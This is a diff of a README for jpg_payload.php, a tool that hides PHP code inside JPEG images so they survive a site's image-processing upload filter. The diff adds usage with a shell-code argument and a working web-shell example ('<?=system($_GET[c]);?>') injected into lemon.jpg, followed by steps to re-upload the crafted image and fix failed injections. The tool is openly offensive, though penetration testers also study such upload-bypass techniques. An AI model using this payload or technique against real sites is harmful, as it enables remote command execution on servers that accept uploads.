@@ -6,7 +6,14 @@ It is necessary that the size and quality of the initial image are the same as t
 
 1) Upload an arbitrary image via secured files upload script
 2) Save the processed image and launch:
-php jpg_payload.php <jpg_name.jpg>
+
+php jpg_payload.php <jpg_name.jpg> <shell_code>
+
+e.g.
+
+```txt
+php jpg_payload.php lemon.jpg '<?=system($_GET[c]);?>'
+```
 
 In case of successful injection you will get a specially crafted image, which should be uploaded again.
 
@@ -15,6 +22,3 @@ Since the most straightforward injection method is used, the following problems 
 2) The jpg_payload.php script outputs "Something's wrong".
 
 If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
-
-See also:
-[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
